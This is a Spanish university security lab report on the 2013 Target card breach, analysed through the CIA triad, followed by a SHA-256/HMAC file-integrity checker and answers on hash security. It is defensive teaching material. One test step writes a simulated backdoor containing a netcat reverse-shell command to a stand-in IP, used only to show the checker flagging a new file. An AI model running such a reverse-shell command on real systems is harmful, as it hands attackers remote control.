# Laboratorio 01 — Informe

---

## Identificación

| | |
|---|---|
| **Grupo** | 08 |
| **Caso asignado (Parte A)** | Caso 2 — Target (brecha de datos de tarjetas), 2013 |
| **Tema del mini-research** | Tema 4 — Criptografía post-cuántica |
| **Fecha de entrega** | Octubre de 2026 |

### Integrantes

| Nombre y apellido | Legajo | Usuario de GitHub |
|---|---|---|
| Marco Cordoba | 14232 | @MarcoCordoba |
| Thomas Koncurat | 14831 | @Koncu1 |
| Lucas Leone | 14700 | @LucasLeone |
| Geronimo Marquez | 14235 | @Geromarquezz |
| Joaquin Moyano | 14622 | @Joaco919 |

---

# PARTE A — Análisis del incidente bajo la lente CIA

## A.1 — Cronología

Los números entre corchetes remiten a la lista de fuentes de la sección A.6.

| Fecha | Hecho | Fuente |
|---|---|---|
| Sep.–oct. 2013 (al menos dos meses antes del robo) | Un correo con malware compromete a Fazio Mechanical Services, contratista de refrigeración de Target, y le roban las credenciales que usaba para acceder a los sistemas de facturación de Target. | [1], [4] |
| 12 nov. 2013 | Los atacantes ingresan por primera vez a la red interna de Target usando las credenciales robadas al proveedor. | [1], [7] |
| 15–28 nov. 2013 | Instalan malware de captura de tarjetas (una variante de *BlackPOS*) en un número reducido de terminales de punto de venta (POS); para el 30 de noviembre la mayoría de los POS estaba infectada. | [1] |
| 28 nov.–3 dic. 2013 | El antivirus Symantec y la herramienta FireEye de Target generan alertas sobre el malware y sobre el servidor comprometido. El equipo de seguridad no actúa sobre ellas. | [1], [5] |
| 2 dic. 2013 | Empieza la exfiltración: los datos salen por FTP, a través de otro servidor interno comprometido, hacia servidores externos (uno de ellos en Rusia). En unas dos semanas se llevan unos 11 GB. | [1] |
| 12 dic. 2013 | El Departamento de Justicia de EE.UU. notifica a Target. Según declaró la propia empresa, hasta ese momento no sabía que la estaban atacando. | [1] |
| 18 dic. 2013 | Brian Krebs publica la existencia de la brecha antes de que Target la anuncie. | [3] |
| 19 dic. 2013 | Target confirma que hasta 40 millones de tarjetas de crédito y débito pudieron verse afectadas en sus tiendas físicas de EE.UU. entre el 27 de noviembre y el 15 de diciembre. | [2] |
| 10 ene. 2014 | Target informa además el robo de nombre, domicilio, teléfono o correo electrónico de hasta 70 millones de personas. | [6] |
| 23 may. 2017 | Target firma un acuerdo de USD 18,5 millones con más de 40 estados y el Distrito de Columbia, y se obliga a mantener un programa de seguridad de la información. | [7] |

---

## A.2 — Activo afectado

**Activo principal:** Los datos de las tarjetas de pago de los clientes que compraron en las tiendas físicas de Target en EE.UU. entre el 27 de noviembre y el 15 de diciembre de 2013. Concretamente, el contenido de la banda magnética (*track data*: número de tarjeta, fecha de vencimiento y código de verificación, además del nombre del titular) de unos 40 millones de tarjetas de crédito y débito [2], [3]. Ese dato existía sin cifrar en la memoria RAM de las terminales POS durante el instante en que se procesaba el pago, y de ahí lo extrajo el malware [1].

**Por qué es el principal:** Fue el objetivo del ataque y el dato que tiene valor directo para el atacante. Con el *track data* se pueden clonar tarjetas y venderlas en el mercado negro [3]. Todo el resto de la operación (robar la credencial del proveedor, moverse dentro de la red, comprometer servidores intermedios) fue un medio para llegar a las terminales que procesaban ese dato. Además es el activo cuya exposición generó el mayor costo: reemplazo de tarjetas por parte de los bancos, fraude, litigios y el acuerdo con los estados [7].

**Otros activos afectados (por orden de prioridad):**

1. **Datos personales de contacto de hasta 70 millones de clientes** (nombre, domicilio, teléfono o correo electrónico) [6]. Va en segundo lugar porque no permiten cometer fraude con tarjetas directamente, pero exponen a los clientes a *phishing* dirigido y robo de identidad, y amplían mucho la cantidad de personas afectadas.
2. **Bloques de PIN cifrados de tarjetas de débito.** Target confirmó que se los llevaron, pero estaban cifrados con Triple DES desde el teclado y la clave de descifrado nunca estuvo en sus sistemas [8]. Su exposición real es baja, por eso van en tercer lugar.
3. **La credencial de acceso del proveedor Fazio y la propia infraestructura de Target** (servidores internos y software de las terminales POS). No es información de clientes, pero fue el activo que habilitó el ataque. Lo listamos aparte para no confundirlo con el activo protegido: es el vector, no el objetivo.

---

## A.3 — Matriz CIA

| Propiedad | ¿Se violó? | Evidencia concreta |
|---|---|---|
| **Confidencialidad** | **Sí** | Unos 40 millones de números de tarjeta con su *track data* y hasta 70 millones de registros de contacto fueron copiados y enviados a servidores externos controlados por los atacantes: unos 11 GB exfiltrados por FTP desde el 2 de diciembre [1], [2], [6]. Personas no autorizadas accedieron a información que solo debían conocer el titular, Target y el emisor de la tarjeta. Es la propiedad central del incidente. |
| **Integridad** | **Parcial** | Ningún dato de clientes fue alterado: los números de tarjeta y los registros de contacto se copiaron, no se modificaron, y las transacciones se procesaron normalmente. Lo que sí se alteró sin autorización fue el **software de las terminales POS**: se les instaló el malware *BlackPOS*, y se actualizaron las variantes de exfiltración el 2 y el 3 de diciembre. También se reconfiguró un servidor interno para que funcionara como punto de acopio y salida de los datos [1]. La integridad del sistema se violó; la integridad de la información protegida, no. |
| **Disponibilidad** | **No** | Las tiendas siguieron vendiendo y los sistemas de pago siguieron funcionando durante toda la ventana del ataque (27 nov.–15 dic.). De hecho, el ataque *necesitaba* que los POS funcionaran para capturar tarjetas [1], [2]. No se cifraron ni borraron datos y no hubo interrupción del servicio. Que después los bancos reemplazaran tarjetas es una consecuencia de la pérdida de confidencialidad, no una violación de la disponibilidad causada por el atacante. |

**Justificación ampliada de la propiedad más discutible:**

La más difícil de determinar fue la **integridad**. La consigna pide mostrar *qué dato fue alterado*, y si se mira solo la información de los clientes la respuesta sería «No»: el ataque fue de robo, no de manipulación. Nadie cambió un número de tarjeta ni un monto, y el informe del Senado describe solo acceso no autorizado, robo y exfiltración [1].

Igual marcamos «Parcial» porque ISO/IEC 27000 define la integridad como la propiedad de exactitud y completitud, y esa propiedad aplica a cualquier activo de información, no solo a los datos de negocio. El software instalado en una terminal POS es un activo de información. En este caso hay un dato alterado y lo podemos nombrar: el conjunto de ejecutables de las terminales POS de Target, al que se le agregó un programa no autorizado (la variante de *BlackPOS*) que cambió su comportamiento para copiar a memoria y enviar los datos de cada tarjeta [1]. Lo mismo vale para el servidor interno que los atacantes reconfiguraron como depósito intermedio.

Distinguimos las dos cosas a propósito. La violación de la integridad del sistema fue el **medio**, y la violación de la confidencialidad de los datos de tarjetas fue el **fin**. Por eso no ponemos «Sí» a secas: el activo principal (A.2) no sufrió ninguna alteración.

---

## A.4 — Encadenamiento amenaza → vulnerabilidad → impacto

```
amenaza  →  explota  →  vulnerabilidad  →  sobre  →  activo  →  produce  →  impacto
```

| Elemento | En este caso |
|---|---|
| **Amenaza** | Un grupo de ciberdelincuentes con motivación económica que buscaba revender datos de tarjetas en el mercado negro. Usó malware comercializado en foros clandestinos (*BlackPOS*) y servidores de exfiltración ubicados en Rusia [1], [5]. |
| **Vulnerabilidad** | Principal: la red de Target no aislaba el entorno de pagos de las zonas a las que accedían los proveedores, y el acceso remoto de proveedores no exigía autenticación de dos factores. Con una credencial de un contratista de facturación se pudo llegar a las terminales POS [1]. Agravantes: las alertas de FireEye y Symantec no se atendieron y la salida de datos hacia el exterior no estaba restringida [1], [5]. (El *exploit* fue el uso de la credencial robada y la instalación del malware: no es la vulnerabilidad.) |
| **Activo** | Los datos de banda magnética de unos 40 millones de tarjetas, procesados en las terminales POS de las tiendas de EE.UU., y en segundo término los datos de contacto de hasta 70 millones de clientes [2], [6]. |
| **Impacto** | Para los clientes: exposición a fraude con tarjetas clonadas y a *phishing* dirigido. Para Target: un costo total de la brecha que la empresa estimó en USD 202 millones, un acuerdo de USD 18,5 millones con más de 40 estados y el Distrito de Columbia [7], y la salida de su CIO en marzo de 2014 y de su CEO en mayo de 2014 [9], [10]. |

**Redacción:**

Un grupo criminal con motivación económica (la **amenaza**) le robó con un correo malicioso las credenciales a Fazio Mechanical, un contratista de Target, y con ellas entró a la red de la empresa. Ahí **explotó** dos debilidades de diseño: los proveedores accedían por acceso remoto sin segundo factor, y la red no separaba las zonas a las que llegaba un proveedor de facturación del entorno donde se procesaban las tarjetas. Esa falta de segmentación es la **vulnerabilidad** central [1]. Usó esa debilidad para instalar *BlackPOS* en las terminales de punto de venta, que es el *exploit* y no la vulnerabilidad. El ataque recayó **sobre** el **activo** que Target tenía que proteger: los datos de banda magnética de unos 40 millones de tarjetas, que el malware leía de la memoria de los POS en el momento del pago, además de los datos de contacto de hasta 70 millones de personas [2], [6]. Las alertas de las herramientas de detección no se atendieron y la salida de datos por FTP no estaba bloqueada, así que nada cortó la cadena antes de la exfiltración [1], [5]. El resultado **produjo** un **impacto** doble. Los clientes quedaron expuestos a fraude y robo de identidad. Target asumió un costo que estimó en USD 202 millones, pagó un acuerdo de USD 18,5 millones con los estados [7] y perdió a su CIO y a su CEO [9], [10].

---

## A.5 — Dos controles mitigantes

### Control 1

| | |
|---|---|
| **Qué es** | Segmentación de red del entorno de datos de tarjetas (*cardholder data environment*, como exige PCI DSS), combinada con acceso de proveedores restringido y autenticado con dos factores. El proveedor solo llega a la aplicación que necesita (el portal de facturación), desde una zona aislada y con reglas de firewall que le impiden cualquier conexión hacia los servidores y terminales de pago. |
| **Propiedad de la tríada que protege** | **Confidencialidad** de los datos de tarjetas. |
| **Por qué habría funcionado en este caso concreto** | El ataque dependió de que una credencial pensada para facturación y gestión de proyectos sirviera para moverse hasta las terminales POS. El informe del Senado identifica justamente que Target no aislaba sus activos más sensibles y que no pedía doble factor a proveedores de bajo nivel [1]. Con segundo factor, la contraseña robada a Fazio por correo no habría alcanzado para entrar. Y aunque entraran, desde la zona del proveedor no habría existido una ruta de red hacia los POS: el atacante habría quedado contenido en el portal de facturación, sin acceso al dato de tarjeta. |

### Control 2

| | |
|---|---|
| **Qué es** | Lista blanca de aplicaciones (*application allowlisting*) en las terminales POS: la terminal solo ejecuta los binarios aprobados y firmados por Target y bloquea cualquier otro ejecutable. Se complementa con una lista blanca de salida: los servidores del entorno de pagos solo pueden conectarse a destinos autorizados, como el procesador de pagos. |
| **Propiedad de la tríada que protege** | **Integridad** del software de las terminales POS y, como consecuencia, **confidencialidad** de los datos de tarjetas. |
| **Por qué habría funcionado en este caso concreto** | Una terminal POS es un equipo de propósito único con un conjunto de programas fijo y conocido, que es el escenario ideal para una lista blanca. *BlackPOS* era un ejecutable nuevo que había que instalar y actualizar en las terminales (el 30 de noviembre y el 2 y 3 de diciembre) [1]. Con la lista blanca no se habría ejecutado y no habría capturado ninguna tarjeta, aunque el atacante ya estuviera dentro de la red. El informe del Senado señala la falta de listas blancas de procesos y de servidores FTP como una oportunidad perdida [1]. La lista blanca de salida cubre la segunda mitad del ataque: los 11 GB salieron por FTP hacia servidores externos, uno en Rusia, un destino que un servidor del entorno de pagos nunca necesita contactar [1]. |

---

## A.6 — Fuentes consultadas (Parte A)

1. U.S. Senate Committee on Commerce, Science, and Transportation, Majority Staff. (2014, 26 de marzo). *A "kill chain" analysis of the 2013 Target data breach* [Informe del personal del comité]. Reproducido en *Protecting personal consumer information from cyber attacks and data breaches* (S. Hrg. 113-531). U.S. Government Publishing Office. https://www.govinfo.gov/content/pkg/CHRG-113shrg92594/html/CHRG-113shrg92594.htm — **Primaria** (informe oficial del Senado de EE.UU.).
2. Target Corporation. (2013, 19 de diciembre). *Target confirms unauthorized access to payment card data in U.S. stores* [Comunicado de prensa]. https://corporate.target.com/press/release/2013/12/target-confirms-unauthorized-access-to-payment-card-data-in-u-s-stores — **Primaria** (comunicado de la empresa afectada).
3. Krebs, B. (2013, 18 de diciembre). Sources: Target investigating data breach. *Krebs on Security*. https://krebsonsecurity.com/2013/12/sources-target-investigating-data-breach/ — **Secundaria** (periodismo de investigación).
4. Krebs, B. (2014, 5 de febrero). Target hackers broke in via HVAC company. *Krebs on Security*. https://krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company/ — **Secundaria**. Complementada con Krebs, B. (2014, 12 de febrero). Email attack on vendor set up breach at Target. https://krebsonsecurity.com/2014/02/email-attack-on-vendor-set-up-breach-at-target/
5. Riley, M., Elgin, B., Lawrence, D. y Matlack, C. (2014, 13 de marzo). Missed alarms and 40 million stolen credit card numbers: How Target blew it. *Bloomberg Businessweek*. https://www.bloomberg.com/news/articles/2014-03-13/target-missed-warnings-in-epic-hack-of-credit-card-data — **Secundaria**.
6. Target Corporation. (2014, 10 de enero). *Target provides update on data breach and financial performance* [Comunicado de prensa]. https://corporate.target.com/press/release/2014/01/target-provides-update-on-data-breach-and-financial-performance — **Primaria**.
7. Office of the Attorney General for the District of Columbia. (2017, 23 de mayo). *Attorney General Racine announces $18.5 million multistate settlement with Target Corporation over 2013 data breach* [Comunicado de prensa]. https://oag.dc.gov/node/128 — **Primaria** (documento oficial de una fiscalía). El costo total de USD 202 millones lo informó Target y lo recoge la cobertura del acuerdo de Associated Press: https://www.fox4news.com/news/target-states-reach-18-5-million-settlement-on-data-breach — **Secundaria**.
8. Target Corporation. (2013, 27 de diciembre). *Target data security media update #4* [Comunicado de prensa]. https://corporate.target.com/press/release/2013/12/target-data-security-media-update-4 — **Primaria**.
9. Christian Science Monitor. (2014, 5 de marzo). Target Corp. tech chief resigns amid security overhaul. https://www.csmonitor.com/Business/2014/0305/Target-Corp.-tech-chief-resigns-amid-security-overhaul — **Secundaria**.
10. The Global Treasurer. (2014, 5 de mayo). Target CEO resigns in wake of data breach. https://www.theglobaltreasurer.com/2014/05/05/target-ceo-resigns-in-wake-of-data-breach/ — **Secundaria**.
11. ISO/IEC. (2018). *ISO/IEC 27000:2018 — Information technology — Security techniques — Information security management systems — Overview and vocabulary*. International Organization for Standardization. — **Primaria** (norma; definiciones de la tríada usadas en A.3).

---

# PARTE B — Integridad con funciones de hash

## B.1 — Evidencia de ejecución

Entorno de ejecución: Windows 10, Python 3.13.13, PowerShell. Los comandos
son los del enunciado; donde el enunciado usa sintaxis de bash (`printf`,
`echo $?`) se indica el equivalente de PowerShell que se usó efectivamente
(`$LASTEXITCODE` es el equivalente de `$?` para el código de salida de un
programa). Por eso las rutas aparecen impresas con `\`: es la ruta que recibe
la CLI en Windows. Las **claves del manifiesto**, en cambio, salen en formato
POSIX (`logs/acceso.log`), que es lo que exige el enunciado.

Datos de muestra regenerados antes de empezar con `python data/generar_datos.py`.

### Generación del manifiesto

```
$ python3 src/integridad.py generar --dir data/muestra --salida manifest.sha256
Manifiesto generado: manifest.sha256
Directorio base:     data\muestra
Archivos indexados:  4

$ cat manifest.sha256
{
  "app.bin": "a1f259d4365ed4320c377ce26f5c8c56dcdc9a89e7b641bfd8eabfbbeac86654",
  "logs/acceso.log": "479bb8382eca943570ac69b7189e4feb62d152436f77cafcf551c52ea00c5cd4",
  "politica_seguridad.md": "4f27c493a553b185aebdea570d0cc4aa5763425de0fc91d51a32eb71a4c46393",
  "transferencia.txt": "4394e0a7006eecb79b32dbfa7471fd7121893239fb94e1a7a3269c31b5262334"
}
```

Se ve el recorrido recursivo (`logs/acceso.log` está en un subdirectorio), las
rutas relativas con `/` aunque se generó en Windows, y las claves ordenadas.

### Verificación sobre un directorio íntegro

```
$ python3 src/integridad.py verificar --dir data/muestra --manifiesto manifest.sha256
$ echo "código de salida: $?"
Directorio:  data\muestra
Manifiesto:  manifest.sha256

  OK             4
  MODIFICADO     0
  FALTANTE       0
  NUEVO          0

INTEGRIDAD VERIFICADA — sin diferencias contra el manifiesto.
código de salida: 0
```

### Detección de la modificación de un byte

Equivalente usado de `printf 'X' >> data/muestra/transferencia.txt`:
`[IO.File]::AppendAllText("data\muestra\transferencia.txt", "X")` (agrega
exactamente un byte, sin salto de línea).

```
$ printf 'X' >> data/muestra/transferencia.txt
$ python3 src/integridad.py verificar --dir data/muestra --manifiesto manifest.sha256
$ echo "código de salida: $?"
Directorio:  data\muestra
Manifiesto:  manifest.sha256

  OK             3
  MODIFICADO     1
  FALTANTE       0
  NUEVO          0

Hallazgos:
  [MODIFICADO] transferencia.txt

INTEGRIDAD COMPROMETIDA — 1 hallazgo(s).
código de salida: 1
```

### Detección de archivo faltante y de archivo nuevo

Se regeneraron los datos (vuelve a quedar `transferencia.txt` original), se
borró `politica_seguridad.md` y se plantó un archivo nuevo dentro del
subdirectorio `logs/`, simulando una backdoor:

```
$ python3 data/generar_datos.py
$ rm data/muestra/politica_seguridad.md
$ printf '#!/bin/sh\nnc -e /bin/sh 203.0.113.44 4444\n' > data/muestra/logs/backdoor.sh
$ python3 src/integridad.py verificar --dir data/muestra --manifiesto manifest.sha256
$ echo "código de salida: $?"
Directorio:  data\muestra
Manifiesto:  manifest.sha256

  OK             3
  MODIFICADO     0
  FALTANTE       1
  NUEVO          1

Hallazgos:
  [FALTANTE] politica_seguridad.md
  [NUEVO] logs/backdoor.sh

INTEGRIDAD COMPROMETIDA — 2 hallazgo(s).
código de salida: 1
```

Prueba adicional — manifiesto guardado **dentro** del directorio recorrido
(no debe indexarse a sí mismo ni aparecer como `NUEVO`):

```
$ python3 src/integridad.py generar --dir data/muestra --salida data/muestra/manifest.sha256
Manifiesto generado: data\muestra\manifest.sha256
Directorio base:     data\muestra
Archivos indexados:  4
$ python3 src/integridad.py verificar --dir data/muestra --manifiesto data/muestra/manifest.sha256
Directorio:  data\muestra
Manifiesto:  data\muestra\manifest.sha256

  OK             4
  MODIFICADO     0
  FALTANTE       0
  NUEVO          0

INTEGRIDAD VERIFICADA — sin diferencias contra el manifiesto.
código de salida: 0
```

### Efecto avalancha

```
$ python3 src/integridad.py avalancha --a "transferencia: $1000" --b "transferencia: $1001"
mensaje A: "transferencia: $1000"
  SHA-256: 341511c4c817d55f30c81e212d0e82b0b16dd5a58d49fe5e45c9d5c998ab794a
mensaje B: "transferencia: $1001"
  SHA-256: 5fb87fd7adf8a226f61c666a3ed140b147501b8a1b8e1822e57fc4b3925323d9

Distancia de Hamming: 139 de 256 bits (54.30 %)
Efecto avalancha: para entradas distintas se espera un valor cercano al 50 %.
```

Control: dos entradas idénticas deben dar distancia 0.

```
$ python3 src/integridad.py avalancha --a "hola" --b "hola"
mensaje A: "hola"
  SHA-256: b221d9dbb083a7f33428d7c2a3c3198ae925614d70210e28716ccaa7cd4ddb79
mensaje B: "hola"
  SHA-256: b221d9dbb083a7f33428d7c2a3c3198ae925614d70210e28716ccaa7cd4ddb79

Distancia de Hamming: 0 de 256 bits (0.00 %)
Los mensajes son idénticos: la distancia tiene que ser 0.
```

**Distancia obtenida:** 139 bits de 256 (54,30 %)

Coincide con lo esperado. Los mensajes difieren en un único carácter (`0` →
`1`, que en ASCII son `0x30` y `0x31`: **un solo bit** de diferencia en la
entrada). Antes de correrlo esperábamos un valor cercano a 128 bits, porque
para una función de hash que se comporta como una función pseudoaleatoria
cada bit de salida tiene probabilidad 1/2 de cambiar, de forma independiente.
La distancia sigue entonces una binomial B(256, 0,5): media 128 y desvío
estándar √(256·0,25) = 8 bits. 139 está a ~1,4 desvíos de la media, dentro
de lo normal. Un bit de entrada cambió más de la mitad de la salida, y no hay
forma de predecir **cuáles** bits a partir del cambio: eso es lo que impide
que un atacante "ajuste" un documento para que su digest quede parecido al
del original.

También comprobamos que contar sobre la cadena hexadecimal daría un número
distinto y sin sentido: por ejemplo `0x0` vs `0xf` difieren en 4 bits pero
en un solo carácter. Probado sobre la función directamente:
`distancia_hamming_bits(b'\x00', b'\xff') == 8` y
`distancia_hamming_bits(b'\x0a', b'\x0b') == 1`; y con digests de distinto
largo lanza `ValueError`.

### HMAC

```
$ python3 src/integridad.py mac --clave "secreto" --mensaje "transferir 1000"
mensaje:      "transferir 1000"
HMAC-SHA256:  96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
```

Tag válido, y tag alterado en el **último dígito hex** (`...f9fe` → `...f9ff`):

```
$ python3 src/integridad.py mac --clave "secreto" --mensaje "transferir 1000" --verificar 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
mensaje:      "transferir 1000"
HMAC-SHA256:  96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
tag recibido: 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe

TAG VÁLIDO — el mensaje es auténtico e íntegro.
código de salida: 0

$ python3 src/integridad.py mac --clave "secreto" --mensaje "transferir 1000" --verificar 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9ff
mensaje:      "transferir 1000"
HMAC-SHA256:  96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
tag recibido: 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9ff

TAG INVÁLIDO — el mensaje fue alterado o la clave no es la correcta.
código de salida: 1
```

Prueba adicional: un tag con caracteres no ASCII (`--verificar "ñ"`) se
reporta como `TAG INVÁLIDO` con código 1, en vez de romper el programa con
una excepción (ver decisión en B.2).

---

## B.2 — Decisiones de implementación

| Decisión | Qué hicimos | Por qué |
|---|---|---|
| Recorrido compartido entre `generar` y `verificar` | Una única función auxiliar `_archivos_del_directorio()` arma la lista de archivos para ambos subcomandos. | Si los dos recorrieran con criterios distintos (p. ej. uno sigue symlinks y el otro no), `verificar` reportaría falsos `NUEVO`/`FALTANTE` sobre un directorio intacto. |
| Exclusión del manifiesto | Se compara `ruta.resolve()` contra `salida.resolve()` (o `ruta_manifiesto.resolve()`). | Comparar las rutas como texto falla si una es relativa y la otra no, o si una viene con `.\` y la otra no. `resolve()` normaliza ambas a ruta absoluta. |
| Enlaces simbólicos | Se ignoran (`is_symlink()` → se saltean). | Seguirlos permitiría que el manifiesto hashee archivos **fuera** del directorio base, o que el recorrido entre en un ciclo. Ignorarlos tiene un costo: un symlink plantado no se reporta como `NUEVO`; lo dejamos documentado como limitación. |
| Solo archivos regulares | `is_file()` filtra directorios. | Los directorios no tienen contenido que hashear; su "cambio" se ve igual en los archivos que contienen (`NUEVO` / `FALTANTE`). Un directorio vacío agregado no se reporta. |
| Archivos vacíos | Se incluyen como cualquier otro: su digest es el SHA-256 de la cadena vacía (`e3b0c442...b855`). | Un archivo vacío puede ser significativo (un archivo de bloqueo, un log truncado por un atacante) y vaciar un archivo tiene que verse como `MODIFICADO`. |
| Directorio vacío | `generar` produce el manifiesto `{}` y `verificar` devuelve las cuatro listas vacías, código 0. | Es el resultado correcto: no hay nada que difiera. No es un error. |
| Digests del manifiesto en mayúscula | Al verificar, el digest registrado se pasa a minúscula antes de comparar. | `hexdigest()` siempre devuelve minúscula; un manifiesto editado o generado por otra herramienta con hex en mayúscula no debería producir falsos `MODIFICADO`. Para el digest del manifiesto se usa `==` porque no es un secreto (está en un archivo legible). |
| Comparación del tag HMAC | `hmac.compare_digest()` sobre **bytes**, con el tag recibido normalizado (`strip().lower()`). | Con `str`, `compare_digest` lanza `TypeError` si el tag recibido tiene caracteres no ASCII: un atacante podría provocar una excepción en vez de un rechazo limpio. Como bytes UTF-8 la comparación siempre devuelve un bool. |
| Tres estados de `mac` | Si no se pasó `--verificar` se devuelve `None`, no `False`. | "No verifiqué" y "verifiqué y dio mal" son distintos; confundirlos genera falsos negativos. |

---

## B.3 — Preguntas de análisis

### 1. El manifiesto por sí solo no alcanza

**Respuesta:**

Nada se lo impide. SHA-256 es una función **pública y sin clave**: cualquiera
que tenga el archivo puede recalcular su digest. El manifiesto prueba que el
contenido actual coincide con *algún* manifiesto, pero no prueba que ese
manifiesto sea el que generó el administrador. Si el atacante tiene escritura
sobre el directorio y sobre `manifest.sha256`, le basta con modificar
`transferencia.txt` y correr `integridad.py generar` (o calcular el digest
nuevo a mano y reemplazar una línea del JSON). La verificación posterior da
`OK` en todo. En términos de la tríada: el manifiesto protege la integridad
de los datos sólo bajo el supuesto de que **el manifiesto mismo** tiene
integridad garantizada por otro medio; si ese supuesto cae, el control no
detecta nada. Lo mismo vale para el propio `integridad.py`: un atacante con
privilegios puede reemplazar el verificador por uno que siempre imprima `OK`.

Hay que romper la condición "quien puede escribir los datos puede escribir la
referencia". Las opciones, de menor a mayor robustez:

- **Guardar el manifiesto fuera del alcance del atacante**: en otro host
  (servidor de monitoreo), en medios de sólo lectura o WORM, o en un
  repositorio versionado al que el sistema monitoreado no tiene escritura.
  Es lo que hacen herramientas FIM como Tripwire o AIDE en su configuración
  recomendada: la base de referencia se guarda en medio de sólo lectura.
- **Autenticar el manifiesto con HMAC**: guardar junto al manifiesto un tag
  HMAC-SHA256 calculado con una clave que **no** está en el host monitoreado.
  El atacante puede regenerar los digests, pero no puede producir un tag
  válido sin la clave, y la verificación del tag falla.
- **Firmar el manifiesto digitalmente** (por ejemplo Ed25519 o RSA-PSS) con
  una clave privada que vive offline o en un HSM; la verificación sólo
  necesita la clave pública, que puede estar en el host sin riesgo. Es el
  esquema que usan los gestores de paquetes (por ejemplo, `Release` firmado
  con GPG en APT): el archivo de hashes está firmado y la clave de firma no
  está en los mirrors.

Además conviene incluir en el manifiesto firmado una **fecha o número de
versión** y verificar que no retroceda, para evitar que el atacante reponga
un manifiesto viejo pero legítimamente firmado (ataque de *rollback*), y
ejecutar la verificación desde un entorno confiable (otro host, o un medio
booteable) para que no dependa de un binario que el atacante pudo alterar.

### 2. Qué agrega HMAC y qué no

**Respuesta:**

Un hash simple garantiza integridad sólo frente a **cambios accidentales** o
frente a quien no puede tocar el digest de referencia: como no tiene clave,
quien altera el mensaje puede recalcular el hash y enviarlo junto. HMAC
(RFC 2104) mete una clave secreta en el cálculo: `HMAC(K, m) = H((K ⊕ opad)
‖ H((K ⊕ ipad) ‖ m))`. Sin conocer `K`, producir un tag válido para un mensaje
nuevo es inviable (la propiedad se llama resistencia a la falsificación,
*unforgeability* bajo ataque de mensaje elegido). Por lo tanto HMAC aporta
**integridad frente a un adversario activo** más **autenticación del
origen**: si el tag verifica, el mensaje fue producido por alguien que tiene
la clave y no fue alterado en el camino. El doble anidado además evita el
ataque de extensión de longitud que sí sufre la construcción ingenua
`SHA-256(K ‖ m)`, porque SHA-256 es Merkle–Damgård y su digest es el estado
interno final.

Lo que HMAC **no** aporta es **no repudio**. La clave es simétrica: la
conocen tanto el emisor como el receptor, y cualquiera de los dos puede
calcular un tag válido para cualquier mensaje. Si el banco recibe
"transferir 1000" con tag válido, sabe que lo generó *alguien con la clave*,
pero frente a un tercero (un juez, un auditor) no puede probar que fue el
cliente y no el propio banco, porque el banco también podría haberlo
fabricado. Para no repudio hace falta criptografía asimétrica: una **firma
digital**, donde sólo el titular tiene la clave privada y cualquiera puede
verificar con la pública.

Tampoco resuelve otras cosas: no da **confidencialidad** (el mensaje viaja en
claro; para eso hay que cifrar, idealmente con un esquema AEAD), no evita
**repeticiones** (un atacante puede reenviar "transferir 1000" con su tag
válido diez veces; hay que incluir un nonce, contador o timestamp dentro de
lo autenticado), y no resuelve la **distribución de la clave**: si la clave
se filtra o es débil (como `"secreto"` en el ejemplo, atacable por
diccionario si se conoce un par mensaje/tag), toda la garantía desaparece.
Con muchos participantes que comparten la misma clave, ni siquiera se puede
saber cuál de ellos emitió el mensaje.

### 3. MD5 y SHA-1

**Respuesta:**

A ambos se les rompió la **resistencia a colisiones**: es computacionalmente
factible encontrar dos entradas distintas `m1 ≠ m2` con `H(m1) = H(m2)`. Para
MD5, Wang y Yu (2005) publicaron colisiones prácticas, y luego Stevens,
Lenstra y de Weger mostraron colisiones de **prefijo elegido** (dos documentos
con prefijos arbitrarios elegidos por el atacante que terminan con el mismo
digest), que se usaron en 2008 para fabricar un certificado de CA falso y en
2012 por el malware Flame para falsificar una firma de código de Microsoft.
Hoy una colisión de MD5 se obtiene en segundos en una PC. Para SHA-1, el
ataque SHAttered (Stevens et al., 2017) produjo la primera colisión pública:
dos PDF distintos con el mismo SHA-1; y Leurent y Peyrin (2020) bajaron el
costo de una colisión de prefijo elegido a niveles alcanzables (~45 mil USD
de GPU alquilada), demostrándola contra firmas PGP.

Lo que **no** se rompió en la práctica es la resistencia a **preimagen** ni
a **segunda preimagen**: dado un digest fijo (o un archivo fijo que no
eligió el atacante), sigue sin conocerse una forma práctica de encontrar otra
entrada con el mismo hash. Esa distinción importa: la colisión le sirve al
atacante cuando **él** controla los dos documentos (genera uno inocente, lo
hace firmar, y después usa el malicioso). Por eso están prohibidos en
firmas digitales, certificados, y cualquier esquema de integridad donde el
adversario pueda preparar el contenido; NIST retiró SHA-1 para firmas
(SP 800-131A) y anunció su retiro total para 2030.

¿Usos aceptables? Algunos, con cuidado: como **checksum no adversarial**
(detectar corrupción accidental, deduplicación interna, claves de caché,
identificadores no de seguridad), donde nadie tiene incentivo para fabricar
colisiones; y dentro de **HMAC**, porque la seguridad de HMAC no depende de
la resistencia a colisiones del hash: el RFC 6151 indica que HMAC-MD5 no se
ve afectado de inmediato por los ataques de colisión, aunque recomienda no
usarlo en diseños nuevos. Git usó SHA-1 como identificador de objetos y tuvo
que agregar detección de colisiones (*sha1collisiondetection*) y migrar a
SHA-256, lo que muestra el límite de ese argumento: un "identificador" pasa a
ser un control de seguridad apenas alguien confía en él para integridad. En
un verificador como el de este laboratorio, donde el contenido del directorio
puede venir de un atacante, ninguno de los dos es aceptable.

**Fuente:**

- Stevens, M., Bursztein, E., Karpman, P., Albertini, A., & Markov, Y. (2017).
  The first collision for full SHA-1. En *Advances in Cryptology – CRYPTO
  2017* (LNCS 10401, pp. 570–596). Springer. https://shattered.io/ *(primaria, arbitrada)*
- Wang, X., & Yu, H. (2005). How to break MD5 and other hash functions. En
  *Advances in Cryptology – EUROCRYPT 2005* (LNCS 3494, pp. 19–35). Springer. *(primaria, arbitrada)*
- Leurent, G., & Peyrin, T. (2020). SHA-1 is a Shambles: First chosen-prefix
  collision on SHA-1 and application to the PGP Web of Trust. En *29th
  USENIX Security Symposium*. https://sha-mbles.github.io/ *(primaria, arbitrada)*
- Turner, S., & Chen, L. (2011). *RFC 6151: Updated security considerations
  for the MD5 message-digest and the HMAC-MD5 algorithms*. IETF.
